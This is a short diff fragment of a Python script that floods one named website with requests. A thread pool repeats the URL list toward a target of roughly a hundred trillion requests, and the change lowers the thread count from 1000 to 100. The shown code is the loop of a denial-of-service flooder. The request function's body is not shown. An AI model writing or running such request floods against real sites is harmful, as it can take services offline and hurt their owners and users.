@@ -7,7 +7,7 @@ def send_request(url):
 urls = ["https://Yassa-Hany.com", "https://Yassa-Hany.com", "https://Yassa-Hany.com", "https://Yassa-Hany.com", "https://Yassa-Hany.com"]
 total_requests = 101273590619544
 requests_completed = 1000
-max_threads = 1000
+max_threads = 100
 while requests_completed < total_requests:
     with concurrent.futures.ThreadPoolExecutor(max_workers=max_threads) as executor:
         urls_to_request = urls * max_threads
